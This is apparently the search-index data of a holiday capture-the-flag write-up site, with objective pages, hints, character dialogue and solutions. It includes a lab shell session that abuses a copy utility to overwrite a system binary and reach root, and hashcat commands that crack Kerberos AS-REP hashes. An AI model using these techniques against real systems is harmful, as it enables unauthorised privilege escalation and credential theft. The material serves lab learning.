env\nHOSTNAME=d5e39028f5f3\nRESOURCE_ID=3f342ba4-af1b-409c-8b37-27cdc88af654\nPWD=/home/elf\nHOME=/home/elf\nLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:\nHHCUSERNAME=Thomasmeeee\nAREA=imtostrichsaloon\nTERM=xterm\nTOKENS=linuxpriv\nSHLVL=1\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nLOCATION=7,6\n_=/usr/bin/env\nelf@d5e39028f5f3:~$ \nelf@d5e39028f5f3:~$ \nelf@d5e39028f5f3:~$ \nelf@d5e39028f5f3:~$ simplecopy /usr/bin/bash /usr/local/sbin/cp  \nelf@d5e39028f5f3:~$ cd /tmp\nelf@d5e39028f5f3:/tmp$ touch abc\nelf@d5e39028f5f3:/tmp$ simplecopy /root/* ./\n/root/runmetoanswer: /root/runmetoanswer: cannot execute binary file\nelf@d5e39028f5f3:/tmp$ echo \"/root/runmetoanswer\" &gt;&gt; abc\nelf@d5e39028f5f3:/tmp$ cat abc\n/root/runmetoanswer\nelf@d5e39028f5f3:/tmp$ simplecopy \"abc\" \"abc\"\nWho delivers Christmas presents?\n\n&gt; santa\nYour answer: santa\n\nChecking....\nYour answer is correct!\n</code></pre>"},{"location":"objectives/o7/#admonitions","title":"Admonitions","text":"<p>Anchor the decorations</p> <p>Ensure that all festive decorations, especially electrical ones, are securely anchored. We don\u2019t want them floating off into the tropical sunset!</p> <p>Palm tree lighting</p> <p>While on the island, make sure to hang your Christmas lights on a palm tree. It\u2019s not only festive but also a great beacon for Santa to find you!</p>"},{"location":"objectives/o7/#images","title":"Images","text":""},{"location":"objectives/o7/#question-1","title":"Question 1","text":"<p>Question</p> <p>Who delivers Christmas presents?</p> <p>Answer</p> <p>santa</p>"},{"location":"objectives/o7/#response","title":"Response","text":"<p>Rose Mold</p> <p>Yup, I knew you knew. You just have that vibe. To answer your question of why from earlier... Nunya! But, I will tell you something better, about some information I... found. There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands. The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there. That's all I got. K byyeeeee. Ugh... n00bs...</p>"},{"location":"objectives/o8/","title":"Game Cartridges: Vol 1","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o8/#objective","title":"Objective","text":"<p>Request</p> <p>Find the first Gamegosling cartridge and beat the game. </p> Dusty Giftwrap (Tarnished Trove) <p>Arrr, matey, shiver me timbers! There be buried treasure herrrrre.</p> <p>Just kidding, I'm not really a pirate, I was just hoping it would make finding the treasure easier.</p> <p>I guess you heard about the fabled buried treasure, too? I didn't expect to see anyone else here. This uncharted islet was hard to find.</p> <p>I bet one of these creepy toys has the treasure, and I'm sure not going anywhere near them!</p> <p>If you find the treasure, come back and show me, and I'll tell you what I was able to research about it.</p> <p>Good luck! You can use <code>&lt;br/&gt;</code> to ensure each sentence starts on a new line.</p>"},{"location":"objectives/o8/#hints","title":"Hints","text":"Gameboy 1 <p>1) Giving things a little push never hurts. 2) Out of sight but not out of ear-shot 3) You think you fixed the QR code? Did you scan it and see where it leads?</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o8/#solution","title":"Solution","text":"<p>Find you cartridge at here: </p> <p></p>"},{"location":"objectives/o8/#i-am-going-to-be-the-pirate-king","title":"I am going to be the pirate king!","text":"<p>Tom Liston is a miner</p> <p>Try sing to the block to the south of Kody\u2019s position.  You can reset the blocks with kody. If you feel like you don't want to hack it but  actually play this one. You can sing to the block. Once you singe to the correct block, it will flash, you need to push it the the place where it supposed to be. For  one particular, you need to \"think outside of the box\". The aim is to fix the QR code, so that you can scan it!! </p> <p> </p>"},{"location":"objectives/o8/#images","title":"Images","text":"<p>Answer</p> <p>Scan the QR code and get: santaconfusedgivingplanetsqrcode</p>"},{"location":"objectives/o8/#response","title":"Response","text":"<p>Dusty Giftwrap (Tarnished Trove)</p> <p>Whoa, you found it!</p> <p>It's a... video game cartridge? Coooooollll... I mean, arrrrrr....</p> <p>So, here's what my research uncovered. Not sure what it all means, maybe you can make sense of it.</p> <p>You have all three? I think that makes you ruler of the pirates!</p>"},{"location":"objectives/o9/","title":"Hashcat","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o9/#objective","title":"Objective","text":"<p>Request</p> <p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!</p> Eve Snowshoes (Scaredy Kite Heights) <p>Greetings, fellow adventurer! Welcome to Scaredy-Kite Heights, the trailhead of the trek through the mountains on the way to the wonderful Squarewheel Yard!</p>"},{"location":"objectives/o9/#hints","title":"Hints","text":"Insert Hint 1 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o9/#solution","title":"Solution","text":"<p>There isn't much to say, just crack the password using hashcat! </p> <p><code>hashcat -m 18200 hash.txt password_list.txt -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 \u2014force</code> </p> <p><code>hashcat -m 18200 --show hash.txt</code></p>"},{"location":"objectives/o9/#images","title":"Images","text":""},{"location":"objectives/o9/#response","title":"Response","text":"<p>Eve Snowshoes</p> <p>Aha! Success! Alabaster will undoubtedly be grateful for our assistance.</p> <p>Onward to our next adventure, comrade! Feel free to explore this whimsical world of gears and steam!</p>"}]}